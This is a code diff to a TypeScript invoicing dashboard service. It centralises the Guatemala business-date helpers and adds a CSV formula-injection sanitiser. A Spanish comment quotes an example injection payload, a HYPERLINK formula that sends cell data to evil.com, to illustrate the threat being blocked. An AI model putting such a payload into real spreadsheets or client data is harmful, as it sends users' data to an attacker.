@@ -3,6 +3,7 @@
 // Todo de solo lectura — este módulo nunca modifica datos, solo los agrega.
 import { InvoiceStatus, Prisma, Role } from "@prisma/client";
 import { prisma } from "../../config/prisma";
+import { startOfBusinessToday, startOfBusinessMonth, startOfBusinessLocalDay } from "../../utils/businessDate";
 import { SalesReportQuery } from "./dashboard.schemas";
 
 interface RequestingUser {
@@ -11,46 +12,18 @@ interface RequestingUser {
 }
 
 // El negocio opera en hora de Guatemala (UTC-6, sin horario de verano), pero
-// el servidor (Railway) corre en UTC. Si "hoy"/"este mes" se calculan con la
-// hora local del proceso, las facturas hechas de 6pm a medianoche (hora GT)
-// caen en el día UTC siguiente y desaparecen de los reportes/gráficas del día
-// que el usuario espera. Se fija el offset del negocio en vez de depender de
-// la zona horaria del contenedor.
-const BUSINESS_UTC_OFFSET_MS = -6 * 60 * 60 * 1000;
-
-// Convierte una fecha cuyos CAMPOS UTC representan una hora de pared en
-// Guatemala (ej. Date.UTC(2026,0,1) = "1 de enero, medianoche, hora de
-// Guatemala") al instante UTC real que le corresponde. Único lugar donde se
-// resta el offset — startOfToday/startOfMonth/startOfLocalDay solo arman
-// esa fecha "de mentira" con los campos que quieren y se lo pasan a esta
-// función, en vez de repetir la resta tres veces.
-function fromBusinessLocalFields(utcFieldsAsBusinessLocal: Date): Date {
-  return new Date(utcFieldsAsBusinessLocal.getTime() - BUSINESS_UTC_OFFSET_MS);
-}
-
-function startOfToday(): Date {
-  const shifted = new Date(Date.now() + BUSINESS_UTC_OFFSET_MS);
-  shifted.setUTCHours(0, 0, 0, 0);
-  return fromBusinessLocalFields(shifted);
-}
-
-function startOfMonth(): Date {
-  const shifted = new Date(Date.now() + BUSINESS_UTC_OFFSET_MS);
-  return fromBusinessLocalFields(new Date(Date.UTC(shifted.getUTCFullYear(), shifted.getUTCMonth(), 1)));
-}
+// el servidor (Railway) corre en UTC — ver utils/businessDate.ts para el
+// razonamiento completo. invoices.service.ts usa el mismo helper para su
+// propio filtro de fechas, así que la lógica vive en un solo lugar.
+const startOfToday = startOfBusinessToday;
+const startOfMonth = startOfBusinessMonth;
+const startOfLocalDay = startOfBusinessLocalDay;
 
 // Misma regla de scoping que invoices.service.ts: un VENDEDOR solo ve sus
 // propias ventas en el dashboard; un ADMIN ve las de todos (objeto de
 // filtro vacío = sin restricción adicional).
 function userScopeWhere(requester: RequestingUser): Prisma.InvoiceWhereInput {
   return requester.role === Role.VENDEDOR ? { userId: requester.id } : {};
-}
-
-// Convierte una fecha de calendario "YYYY-MM-DD" (tal como la ve el usuario
-// en Guatemala) a su medianoche real en UTC, igual que startOfToday().
-function startOfLocalDay(dateStr: string, addDays = 0): Date {
-  const [year, month, day] = dateStr.split("-").map(Number);
-  return fromBusinessLocalFields(new Date(Date.UTC(year, month - 1, day + addDays)));
 }
 
 // Arma todos los KPIs de la pantalla principal del dashboard en un solo
@@ -171,6 +144,18 @@ export async function getSalesReport(query: SalesReportQuery, requester: Request
   }));
 }
 
+// Excel/Sheets interpretan una celda que empieza con =, +, -, @ o un tab
+// como el inicio de una fórmula, no como texto. `client` viene de
+// Client.name, que cualquier usuario autenticado controla al crear un
+// cliente (no requiere ser ADMIN) — sin este chequeo, un cliente con nombre
+// `=HYPERLINK("http://evil.com?d="&A1,"ver")` se convierte en un link vivo
+// (o peor) en la computadora del ADMIN que abra el reporte exportado. Un
+// apóstrofe al inicio le dice a la hoja de cálculo "esto es texto", sin
+// cambiar cómo se ve el valor para un humano.
+function sanitizeCsvCell(value: string): string {
+  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+}
+
 // Convierte filas de getSalesReport a texto CSV, escapando comillas dobles
 // y envolviendo cada valor entre comillas (así una coma dentro de un nombre
 // de cliente no rompe las columnas). Usado por el endpoint
@@ -184,7 +169,7 @@ export function toCsv(rows: Array<Record<string, unknown>>): string {
       headers
         .map((h) => {
           const value = row[h];
-          const str = value instanceof Date ? value.toISOString() : String(value);
+          const str = value instanceof Date ? value.toISOString() : sanitizeCsvCell(String(value));
           return `"${str.replace(/"/g, '""')}"`;
         })
         .join(",")
